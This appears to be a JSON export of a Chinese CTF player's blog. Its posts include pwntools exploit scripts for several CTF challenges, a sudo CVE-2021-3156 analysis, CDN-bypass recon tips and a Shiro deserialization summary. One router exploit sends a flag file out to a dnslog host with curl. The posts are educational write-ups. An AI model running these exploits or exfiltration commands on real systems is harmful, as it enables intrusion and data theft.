{"meta":{"title":"nepire的舰队","subtitle":null,"description":"渴求着能撼动世界的力量","author":"nepire","url":""},"pages":[{"title":"client","date":"2018-12-20T15:13:35.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"client/index.html","permalink":"/client/index.html","excerpt":"","text":"直接下载 or 扫码下载：","keywords":"Android客户端"},{"title":"about","date":"2018-12-12T14:14:36.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"[断竹残赋nepire] 与&nbsp; Nepire &nbsp; （ ） 对话中... bot_ui_ini()","keywords":"关于"},{"title":"donate","date":"2018-12-20T15:13:05.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"donate/index.html","permalink":"/donate/index.html","excerpt":"","text":"","keywords":"谢谢饲主了喵~"},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2021-02-22T08:47:37.325Z","comments":true,"path":"comment/index.html","permalink":"/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》","keywords":"留言板"},{"title":"lab","date":"2019-01-05T13:47:59.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"lab/index.html","permalink":"/lab/index.html","excerpt":"","text":"sakura主题balabala","keywords":"Lab实验室"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2021-02-22T08:47:37.325Z","comments":false,"path":"bangumi/index.html","permalink":"/bangumi/index.html","excerpt":"","text":"","keywords":null},{"title":"music","date":"2018-12-20T15:14:28.000Z","updated":"2021-02-22T08:47:37.329Z","comments":false,"path":"music/index.html","permalink":"/music/index.html","excerpt":"","text":"","keywords":"喜欢的音乐"},{"title":"links","date":"2018-12-19T15:11:06.000Z","updated":"2021-02-22T08:47:37.325Z","comments":true,"path":"links/index.html","permalink":"/links/index.html","excerpt":"","text":"","keywords":"友人帐"},{"title":"rss","date":"2018-12-20T15:09:03.000Z","updated":"2021-02-22T08:47:37.329Z","comments":true,"path":"rss/index.html","permalink":"/rss/index.html","excerpt":"","text":""},{"title":"theme-sakura","date":"2019-01-04T14:53:25.000Z","updated":"2021-02-22T08:47:37.329Z","comments":false,"path":"theme-sakura/index.html","permalink":"/theme-sakura/index.html","excerpt":"","text":"Hexo主题Sakura修改自WordPress主题Sakura，感谢原作者Mashiro","keywords":"Hexo 主题 Sakura 🌸"},{"title":"tags","date":"2018-12-12T14:14:16.000Z","updated":"2021-02-22T08:47:37.329Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"video","date":"2018-12-20T15:14:38.000Z","updated":"2021-02-22T08:47:37.329Z","comments":false,"path":"video/index.html","permalink":"/video/index.html","excerpt":"","text":"var videos = [ { img: 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '放送时间: 2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' }, { img : 'https://lain.bgm.tv/pic/cover/l/0e/1e/218971_2y351.jpg', title: '朝花夕誓——于离别之朝束起约定之花', status: '已追完', progress: 100, jp: 'さよならの朝に約束の花をかざろう', time: '2018-02-24 SUN.', desc: ' 住在远离尘嚣的土地，一边将每天的事情编织成名为希比欧的布，一边静静生活的伊欧夫人民。在15岁左右外表就停止成长，拥有数百年寿命的他们，被称为“离别的一族”，并被视为活着的传说。没有双亲的伊欧夫少女玛奇亚，过着被伙伴包围的平稳日子，却总感觉“孤身一人”。他们的这种日常，一瞬间就崩溃消失。追求伊欧夫的长寿之血，梅萨蒂军乘坐着名为雷纳特的古代兽发动了进攻。在绝望与混乱之中，伊欧夫的第一美女蕾莉亚被梅萨蒂带走，而玛奇亚暗恋的少年克里姆也失踪了。玛奇亚虽然总算逃脱了，却失去了伙伴和归去之地……。' } ] .should-ellipsis{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:95%;}.should-ellipsis-full{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width:100%;}.should-ellipsis i{position:absolute;right:24px;}.grey-text{color:#9e9e9e !important}.grey-text.text-darken-4{color:#212121 !important}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}img{border-style:none}progress{display:inline-block;vertical-align:baseline}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{-webkit-box-sizing:border-box;box-sizing:border-box}*,*:before,*:after{-webkit-box-sizing:inherit;box-sizing:inherit}ul:not(.browser-default){padding-left:0;list-style-type:none}ul:not(.browser-default)>li{list-style-type:none}.card{-webkit-box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2);box-shadow:0 2px 2px 0 rgba(0,0,0,0.14),0 3px 1px -2px rgba(0,0,0,0.12),0 1px 5px 0 rgba(0,0,0,0.2)}.hoverable{-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s}.hoverable:hover{-webkit-box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);box-shadow:0 8px 17px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}i{line-height:inherit}i.right{float:right;margin-left:15px}.bangumi .right{float:right !important}.material-icons{text-rendering:optimizeLegibility;-webkit-font-feature-settings:'liga';-moz-font-feature-settings:'liga';font-feature-settings:'liga'}.row{margin-left:auto;margin-right:auto;margin-bottom:20px}.row:after{content:\"\";display:table;clear:both}.row .col{float:left;-webkit-box-sizing:border-box;box-sizing:border-box;padding:0 .75rem;min-height:1px}.row .col.s12{width:100%;margin-left:auto;left:auto;right:auto}@media only screen and (min-width:601px){.row .col.m6{width:50%;margin-left:auto;left:auto;right:auto}}html{line-height:1.5;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI\",Roboto,Oxygen-Sans,Ubuntu,Cantarell,\"Helvetica Neue\",sans-serif;font-weight:normal;color:rgba(0,0,0,0.87)}@media only screen and (min-width:0){html{font-size:14px}}@media only screen and (min-width:992px){html{font-size:14.5px}}@media only screen and (min-width:1200px){html{font-size:15px}}.card{position:relative;margin:.5rem 0 1rem 0;background-color:#fff;-webkit-transition:-webkit-box-shadow .25s;transition:-webkit-box-shadow .25s;transition:box-shadow .25s;transition:box-shadow .25s,-webkit-box-shadow .25s;border-radius:2px}.card .card-title{font-size:24px;font-weight:300}.card .card-title.activator{cursor:pointer}.card .card-image{position:relative}.card .card-image img{display:block;border-radius:2px 2px 0 0;position:relative;left:0;right:0;top:0;bottom:0;width:100%}.card .card-content{padding:24px;border-radius:0 0 2px 2px}.card .card-content p{margin:0}.card .card-content .card-title{display:block;line-height:32px;margin-bottom:8px}.card .card-content .card-title i{line-height:32px}.card .card-reveal{padding:24px;position:absolute;background-color:#fff;width:100%;overflow-y:auto;left:0;top:100%;height:100%;z-index:3;display:none}.card .card-reveal .card-title{cursor:pointer;display:block}.waves-effect{position:relative;cursor:pointer;display:inline-block;overflow:hidden;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;-webkit-tap-highlight-color:transparent;vertical-align:middle;z-index:1;-webkit-transition:.3s ease-out;transition:.3s ease-out}.waves-effect img{position:relative;z-index:-1}.waves-block{display:block}::-webkit-input-placeholder{color:#d1d1d1}::-moz-placeholder{color:#d1d1d1}:-ms-input-placeholder{color:#d1d1d1}::-ms-input-placeholder{color:#d1d1d1}[type=\"radio\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"radio\"]:not(:checked)+span{position:relative;padding-left:35px;cursor:pointer;display:inline-block;height:25px;line-height:25px;font-size:1rem;-webkit-transition:.28s ease;transition:.28s ease;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border-radius:50%}[type=\"radio\"]:not(:checked)+span:before,[type=\"radio\"]:not(:checked)+span:after{border:2px solid #5a5a5a}[type=\"radio\"]:not(:checked)+span:after{-webkit-transform:scale(0);transform:scale(0)}[type=\"checkbox\"]:not(:checked){position:absolute;opacity:0;pointer-events:none}[type=\"checkbox\"]:not(:checked):disabled+span:not(.lever):before{border:none;background-color:rgba(0,0,0,0.42)}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):before{width:0;height:0;border:3px solid transparent;left:6px;top:10px;-webkit-transform:rotateZ(37deg);transform:rotateZ(37deg);-webkit-transform-origin:100% 100%;transform-origin:100% 100%}[type=\"checkbox\"].filled-in:not(:checked)+span:not(.lever):after{height:20px;width:20px;background-color:transparent;border:2px solid #5a5a5a;top:0px;z-index:0}input[type=checkbox]:not(:disabled) ~ .lever:active:before,input[type=checkbox]:not(:disabled).tabbed:focus ~ .lever::before{-webkit-transform:scale(2.4);transform:scale(2.4);background-color:rgba(0,0,0,0.08)}input[type=range].focused:focus:not(.active)::-webkit-slider-thumb{-webkit-box-shadow:0 0 0 10px rgba(38,166,154,0.26);box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-moz-range-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)}input[type=range].focused:focus:not(.active)::-ms-thumb{box-shadow:0 0 0 10px rgba(38,166,154,0.26)} 番组计划 这里将是永远的回忆 window.onload = function(){ videos.forEach(function(video, i){ $('#rootRow').append(` ${video.title} ${video.jp} ${video.status} ${video.title} ${video.jp} 放送时间: ${video.time} ${video.desc} ${video.status} `) }) }","keywords":"B站"}],"posts":[{"title":"2021qwbfinal_mirouter","slug":"2021qwbfinal-mirouter","date":"2021-07-25T08:34:18.000Z","updated":"2021-07-25T08:35:06.615Z","comments":true,"path":"2021/07/25/2021qwbfinal-mirouter/","link":"","permalink":"/2021/07/25/2021qwbfinal-mirouter/","excerpt":"","text":"https://transparent-mirror-7c0.notion.site/2021-final-da67b742e4724267ac407af3cc955bcc","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"CVE-2021-3156","slug":"CVE-2021-3156","date":"2021-02-04T12:20:21.000Z","updated":"2021-02-22T08:49:52.243Z","comments":true,"path":"2021/02/04/CVE-2021-3156/","link":"","permalink":"/2021/02/04/CVE-2021-3156/","excerpt":"","text":"CVE-2021-3156简介sudo中堆溢出导致的权限提升 通过越界覆盖结构体内容劫持加载的libc，并制作setuid为0起root_shell的一个库 关键漏洞函数为set_cmnd，源码路径为”plugins/sudoers/sudoers.c” 关键利用函数为nss_load_library，源码路径为”nss/nsswitch.c” 分析环境ubuntu@1804:~/CVE-2021-3156$ uname -a Linux 1804 4.15.0-136-generic #140-Ubuntu SMP Thu Jan 28 05:20:47 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux ubuntu@1804:~/CVE-2021-3156$ sudo -V Sudo version 1.8.21p2 Sudoers policy plugin version 1.8.21p2 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.21p2 漏洞函数841 /* set user_args */ 842 if (NewArgc &gt; 1) { 843 char *to, *from, **av; 844 size_t size, n; 845 846 /* Alloc and build up user_args. */ 847 for (size = 0, av = NewArgv + 1; *av; av++) 848 size += strlen(*av) + 1; 849 if (size == 0 || (user_args = malloc(size)) == NULL) { 850 sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;)); 851 debug_return_int(-1); 852 } 853 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { 854 /* 855 * When running a command via a shell, the sudo front-end 856 * escapes potential meta chars. We unescape non-spaces 857 * for sudoers matching and logging purposes. 858 */ 859 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { 860 while (*from) { 861 if (from[0] == &#39;\\\\&#39; &amp;&amp; !isspace((unsigned char)from[1])) 862 from++; 863 *to++ = *from++; 864 } 865 *to++ = &#39; &#39;; 866 } 867 *--to = &#39;\\0&#39;; 868 }","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"二进制面试相关","slug":"二进制面试相关","date":"2020-12-23T03:23:26.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/12/23/二进制面试相关/","link":"","permalink":"/2020/12/23/二进制面试相关/","excerpt":"","text":"","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"GeekPwn_warmmp","slug":"GeekPwn-warmmp","date":"2020-10-20T07:05:20.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/10/20/GeekPwn-warmmp/","link":"","permalink":"/2020/10/20/GeekPwn-warmmp/","excerpt":"","text":"GeekPwn warmmp摸鱼 pwnbabypwnglibc2.23的题确实好久不见了show函数的idx只检验上限未检验下限刚好alarm地址在那，size=0时又能无限写然后之后就是fsop（FileStructure确实好用） from pwn import* context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&quot;./pwn&quot;) elf = ELF(&quot;./pwn&quot;) libc = elf.libc def choice(idx): n.recvuntil(&quot;Input your choice:&quot;) n.sendline(str(idx)) def new(size,content,name=&quot;n&quot;): choice(1) n.recvuntil(&quot;Member name:&quot;) n.sendline(name) n.recvuntil(&quot;Description size:&quot;) n.sendline(str(size)) n.recvuntil(&quot;Description:&quot;) n.sendline(content) def free(idx): choice(2) n.recvuntil(&quot;index:&quot;) n.sendline(str(idx)) def show(idx): choice(3) n.recvuntil(&quot;index:&quot;) n.sendline(str(idx)) def pshow(): for i in range(3): show(-4-i) n.recvuntil(&quot;name:&quot;) print hex(u64(n.recvline()[:-1].ljust(8,&quot;\\x00&quot;))) show(-4) n.recvuntil(&quot;name:&quot;) libcbase = u64(n.recvline()[:-1].ljust(8,&#39;\\x00&#39;)) - libc.sym[&#39;alarm&#39;] print hex(libcbase) system = libcbase + libc.sym[&#39;system&#39;] io_list_all = libcbase + libc.sym[&#39;_IO_list_all&#39;] new(0x10,&#39;0000&#39;) new(0x10,&#39;1111&#39;) free(1) free(0) new(0,&#39;&#39;) show(0) n.recvuntil(&quot;Description:&quot;) heapbase = u64(n.recv(6)+&quot;\\x00\\x00&quot;)-0x20 print hex(heapbase) #gdb.attach(n) new(0x10,&#39;1111&#39;) new(0x40,&#39;2222&#39;) new(0x40,(p64(0)+p64(0x11))*4) new(0x40,&#39;4444&#39;) new(0x40,&#39;5555&#39;) free(0) payload = &#39;\\x00&#39;*0x10 + p64(0) + p64(0x91) new(0,payload) free(1) free(0) fileStr = FileStructure(null=0) fileStr.flags = u64(&quot;/bin/sh\\0&quot;) fileStr._IO_read_ptr=0x61 fileStr._IO_read_end=0 fileStr._IO_read_base=io_list_all-0x10 fileStr._IO_write_base=2 fileStr._IO_write_ptr=3 fileStr.vtable = heapbase + 0xe0+0x20 payload = &quot;a&quot;*0x10+bytes(fileStr) payload += p64(0)*2 + p64(system)*2 new(0,payload) n.interactive()","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"作业没做完打不了N1CTF惨惨","slug":"作业没做完打不了N1CTF惨惨","date":"2020-10-20T06:23:03.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/10/20/作业没做完打不了N1CTF惨惨/","link":"","permalink":"/2020/10/20/作业没做完打不了N1CTF惨惨/","excerpt":"","text":"#n1ctf摸鱼路上财务报表作业要交了惨惨 做到后面突然想起了作业还没写，半途跑路（惨惨 赛后和出题人聊了下发现本来是0day题，但环境没配好，结果就是这题的利用简单了很多，虽然只有四解 Babyrouter 这次就整了这题，题目给了个docker包 但从我在Windows下解压这个环境的时候就gg了，这些环境问题最后再一起说 很明显的能知道我们需要分析的是httpd，经过简单的分析过后我们能知道这是 Tenda AC9 V1.0 V15.03.05.19 的路由器的一部分，这种时候能去找cve或者直接挖0day来做题，脚本稍微扫一下 emmm，这里面应该不少0day但我还是直接找cve吧，一个个看过去可太慢了 随便拿了个出来发现确实存在，不过网上只有poc，exp需要我们自己去写 最蛋疼的就是搭调试环境了，找洞三分钟，搭环境三小时 当时在审计的时候看到字符串有个doshell还以为是什么官方后门，找到对应函数才发现不是，不过也为我们利用提供了不少便利，我们只要设置好$r11然后跳转到这就能任意命令执行 这里先简单的介绍下ldr的命令 LDR R0，[R1，#8] ；将存储器地址为R1+8的字数据读入寄存器R0 然后回到fromaddressnat 通过简单的测试后发现填充的cccc是返回地址，就是pc，修改对应位置为doshell所在的位置后重新调试成功跳转 但由于\\$r11和\\$r4没设置成正确指针所以无法再继续步进，构造下指针就能任意代码执行了，懒的反弹shell就直接dns带出来了 exp如下 #!/usr/bin/env python2 # n1ctf{42926f989b610f3f8e717d8a252bcc21} from pwn import * import requests cmd = &#39;curl $(cat /flag).yf2erc.dnslog.cn;&#39; #cmd = &quot;&quot; payload = p32(0xf6fff9ec+4)+cmd.ljust(0xf0,&quot;a&quot;) payload += p32(0xf6fff9ec+16) payload += p32(0x6B154) data = {&#39;entrys&#39;:&#39;aaaa&#39;,&#39;mitInterface&#39;:&#39;aaaa&#39;,&#39;page&#39;:payload} cookie = {&#39;Cookie&#39;:&#39;password=1234&#39;} #r = requests.post(&#39;http://127.0.0.1:2333/goform/addressNat&#39;,data = data,cookies=cookie) r = requests.post(&#39;http://8.210.119.59:9990/goform/addressNat&#39;,data = data,cookies=cookie) 重点笔记开始了，主要有两个总结的地方 1.lib的链接问题 我在上面也讲了，在Windows下解压这个环境gg了，先说结果，在windows下解压带符号链接的zip包时会导致链接失效变成ascii文本，然后在我写这篇文章时发现即使在ubuntu环境下，利用ubuntu自带的gui解压工具把文件拖出来链接文件是直接不显示不解析，也不会解压 只有unzip file.zip才能正常带符号的解压出来 2.调试环境 这次比较好整，就改了run.sh和start.sh两个文件修改如下 剩下的就是外部使用gdb-multiarch调试本地1147端口，都是传统调试方法，然后还是推一波我的gdb环境 https://github.com/Nepire/Pwngdb","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"摸鱼之战","slug":"摸鱼之战","date":"2020-08-28T07:05:30.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/08/28/摸鱼之战/","link":"","permalink":"/2020/08/28/摸鱼之战/","excerpt":"","text":"摸鱼城之战摸……钓鱼城杯和洞佬他们组了个队摸了一天鱼，快乐就完事 Cryptoconfused_flag爆破，因为flag内的东西不是明文所以符合格式的有好几个一个个去试，最后试成功了 #flag{b09dfe78-df9e-36dd-89a1-b7efb2e19e65} from pwn import * for i in range(500): n = remote(&quot;119.3.45.222&quot;,9999) cip = n.recvline()[:-1] n.close() if cip[0:5]==&quot;flag{&quot; and cip[13]==&quot;-&quot; and cip[18]==cip[23]: print cip PWNfsplayground一个文件读写系统，限制了读的文件名里包括路径不能含有flag，这里我们选择读/proc/self/maps获取libcbase然后往/proc/self/mem里free_hook的地址写onegadget一把梭 #flag{910efb50faa7407b916c206217951dd0} from pwn import * context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) #n = process(&quot;./chall&quot;) n = remote(&quot;119.3.111.133&quot;,6666) elf = ELF(&quot;./chall&quot;) libc = elf.libc def choice(idx): n.recvuntil(&quot;Your choice: &quot;) n.sendline(str(idx)) def fs_open(filename,idx): choice(1) n.recvuntil(&quot;Filename: &quot;) n.send(filename) n.recvuntil(&quot;Option: &quot;) n.sendline(str(idx)) def fs_close(): choice(2) def fs_seek(offset): choice(3) n.recvuntil(&quot;Offset: &quot;) n.sendline(str(offset)) def fs_read(size): choice(4) n.recvuntil(&quot;Size: &quot;) n.sendline(str(size)) def fs_write(size,content): choice(5) n.recvuntil(&quot;Size: &quot;) n.sendline(str(size)) n.recvuntil(&quot;Content: &quot;) n.send(content) def fs_exit(): choice(6) fs_open(&quot;/proc/self/maps&quot;,0) fs_read(0x300) n.recvuntil(&quot;Content: &quot;) codebase = int(n.recv(12),16) print hex(codebase) n.recvuntil(&quot;r-xp&quot;) libcbase = int(n.recvuntil(&quot;r-xp&quot;)[-30:-18],16) print hex(libcbase) fs_close() fs_open(&quot;/proc/self/mem&quot;,1) free_hook = libcbase + libc.sym[&quot;__free_hook&quot;] one = libcbase + 0x4f3c2 fs_seek(free_hook) fs_write(0x10,p64(one)) n.interactive() 剩下的就是赛后复现了，等有空写","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"长亭面试经","slug":"长亭面试经","date":"2020-08-13T07:05:34.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/08/13/长亭面试经/","link":"","permalink":"/2020/08/13/长亭面试经/","excerpt":"","text":"git炸了，这档没了","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"只涅：面试二度","slug":"只涅：面试二度","date":"2020-07-18T07:08:11.000Z","updated":"2021-02-22T08:49:52.251Z","comments":true,"path":"2020/07/18/只涅：面试二度/","link":"","permalink":"/2020/07/18/只涅：面试二度/","excerpt":"","text":"只涅：面试二度争取到了第二次的面试机会，只能说比上次稍微成长了一些，但还是没能达到预期，记录下一些没能说清楚的东西 绕过CDN查找真实IP方法验证可以通过多地ping域名和nslookup来判断目标是否存在cdn DNS历史解析记录 https://dnsdb.io/zh-cn/https://x.threatbook.cn/http://toolbar.netcraft.com/site_report?url=http://viewdns.info/http://www.17ce.com/https://community.riskiq.com/http://www.crimeflare.com/cfssl.htmlhttps://tools.ipip.net/cdn.phphttps://securitytrails.com/ 子域名反查原因：可能因为成本或其他原因没有给每个域名套cdn https://x.threatbook.cn/https://dnsdb.io/zh-cn/ #domain type:A搜索引擎语法子域名扫描器 网络空间引擎搜索法 zoomeye,shodan，fofa特征：特有的http头部（如server类型、版本、cookie等信息)特定keyword（如title、css、js、url等）特定的IP段搜索（如fofa支持C段搜索） 证书查询https://censys.io/ 语句parsed.names: domain and tags.raw: trusted 目标文件信息泄漏通过目标泄漏出来的信息里是否包含真实ip 目标主动连接通过目标主机合法或着通过漏洞发起对自己的主机的请求就能不受cdn的影响获得ip 国外主机解析域名获取针对国内cdn厂商大多只做了国内的线路，国外主机可能直接获得真实ip cdn本身手段不限，获得目标网站管理员配置cdn的帐号，可通过配置直接获取 shiro反序列化原理原因rememberMe的AES加密密钥硬编码于源码已知密钥便可伪造可被正确解密的序列，使得反序列化的payload可控方法攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送，服务端对恶意对象进行反序列化引发命令执行","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"19百越杯记录","slug":"19百越杯记录","date":"2019-11-27T15:33:35.000Z","updated":"2021-02-22T08:49:52.239Z","comments":true,"path":"2019/11/27/19百越杯记录/","link":"","permalink":"/2019/11/27/19百越杯记录/","excerpt":"","text":"线下也打完了，虽然结果不尽人意，但还是稍微写写吧 Online完美爆0，不愧是我，腐朽了大半年的枯木 easy_printfnepire@vm:~/CTF/19百越/easy_printf$ checksec easy_printf [*] Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 除PIE外全开 简单逆向后发现有个格式化字符串漏洞，但关了标准输出 第一思路肯定是先把程序构造成环 这里我们想到可以用_dl_fini的那个 由于这时rdx是已经被固定的，所以我们需要操作r12的值 实际上对r12的操作是这样的 然后我们发现一个很神奇的地址 rbx的值实际在相当深的栈里（个人习惯是只看stack 50） 所以我们需要往比原先rbx还高的地址写入ret的地址让程序ret回格式化字符串的位置使得能无限利用，这里直接选择往bss段地址去写 然后就形成了第一个loop 接着我们到第二次格式化字符串的位置，这里再看看 发现能直接改栈循环了 然后就是泄露libc和stack地址出来了，我们很容易就找到下面一点就有栈地址和libc地址 泄露出来后就为所欲为了，最简单的就是直接把ret地址改onegadget然后由于关stdout就用 管道把输出改成2也就是cat flag&gt;&amp;2来getflag Final感觉很适合初学者的ad题目？漏洞之间相对独立，简单的看下题目 GasSystemnepire@vm:~/CTF/19百越/final$ checksec pwn Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) defence这里能很容易的发现四个能getshell的点 都很简单，有一个甚至算不上漏洞，直接按程序流执行就能getshell 这里主要分享patch的思路 由于存在三个地方有栈溢出，那么首先得把三个地方的read_size改了 现在网上大部分的IDA都是吾爱破解的那个版本，所以一般都会自带keypatch，所以直接选中0x100然后ctrl+alt+k来启用keypatch来改数据，这里的两个直接改成size=0x40 而另外的一个根据它对rbp的偏移改成0x30较稳妥 然后就是对eval函数的处理，这里可以改的有两个，挑一个或全改都行 （比赛中不少队改的是这个） 然后就是这个全场修补率最低的格式化字符串？ 有一说一，这个主办方的check是很松的，只要call printf改call puts就行了，完全不需要考虑\\n的问题 attack这里攻击方法其实还挺多(?)的，虽然都是简单用法，这里就不一个个细讲了 先是最快的用来前期在patch前偷分的 from pwn import* import base64 context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf = ELF(&#39;./pwn&#39;) libc = elf.libc admin_id = base64.b64decode(&quot;NzE2NTIyMwo=&quot;) n.recvuntil(&quot;id&quot;) n.send(str(admin_id)) n.recvuntil(&#39;\\xa4\\n&#39;) n.sendline(&quot;6666&quot;) n.sendline(&quot;cat flag&quot;) n.interactive() 接着patch先改了了eval里的system函数为其他函数但未改/bin/sh的情况 from pwn import* import base64 context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf = ELF(&#39;./pwn&#39;) libc = elf.libc pop_ret = 0x400db3 user_id = base64.b64decode(&quot;bmVwaXJl&quot;) n.recvuntil(&quot;id&quot;) n.sendline(str(user_id)) n.recvuntil(&#39;\\x8d\\n&#39;) n.sendline(&quot;a&quot;*0x38+p64(pop_ret)+p64(0x400E1A)+p64(elf.plt[&#39;system&#39;])) n.sendline(&quot;cat flag&quot;) n.interactive() 接着就是把system和/bin/sh全nop掉的情况 from pwn import* import base64 context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf = ELF(&#39;./pwn&#39;) libc = elf.libc pop_ret = 0x400db3 user_id = base64.b64decode(&quot;bmVwaXJl&quot;) n.recvuntil(&#39;id&#39;) n.sendline(str(user_id)) n.recvuntil(&#39;\\x8d\\n&#39;) payload = &#39;a&#39;*0x38+p64(pop_ret)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(0x400C1E) n.sendline(payload) libcbase = u64(n.recvuntil(&#39;\\x7f&#39;)[-6:]+&#39;\\x00\\x00&#39;)-libc.sym[&#39;puts&#39;] print hex(libcbase) system = libcbase + libc.sym[&#39;system&#39;] sh = libcbase + libc.search(&#39;/bin/sh&#39;).next() n.recvuntil(&#39;\\x8d\\n&#39;) payload = &#39;a&#39;*0x38+p64(pop_ret)+p64(sh)+p64(system) n.sendline(payload) n.sendline(&quot;cat flag&quot;) n.interactive() 然后是把程序内栈溢出全部patch的情况，这时就是用格式化字符串来打 from pwn import* import base64 context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;) n = process(&#39;./pwn&#39;) elf = ELF(&#39;./pwn&#39;) libc = elf.libc def fmtstr(offset, addr, data, written=0): cnt = 0 payload = &#39;&#39; address = &#39;&#39; for x in data: cur = ord(x) if cur &gt;= written&amp;0xff: to_add = cur - (written&amp;0xff) else: to_add = 0x100 + cur - (written&amp;0xff) round = &#39;&#39; if to_add != 0: round += &quot;%{}c&quot;.format(to_add) round += &quot;%{}$hhn&quot;.format(offset+cnt+len(data)*2) assert(len(round) &lt;= 0x10) written += to_add + 0x10 - len(round) payload += round.ljust(0x10, &#39;_&#39;) address += p64(addr+cnt) cnt+=1 return payload + address pop_ret = 0x400db3 admin_id = base64.b64decode(&quot;NzE2NTIyMwo=&quot;) n.recvuntil(&#39;id&#39;) n.send(str(admin_id)) n.recvuntil(&#39;\\xa4\\n&#39;) payload =&quot;%9$p&quot; n.sendline(payload) n.recvuntil(&#39;0x&#39;) libcbase = int(n.recv(12),16)-0x5f1168 system = libcbase + libc.sym[&#39;system&#39;] print hex(libcbase) one_gadget = libcbase + 0xf1147 offset = 8 payload = fmtstr(offset,elf.got[&#39;printf&#39;],p64(system)) n.sendline(payload) n.sendline(&quot;/bin/sh&quot;) n.interactive() #致谢 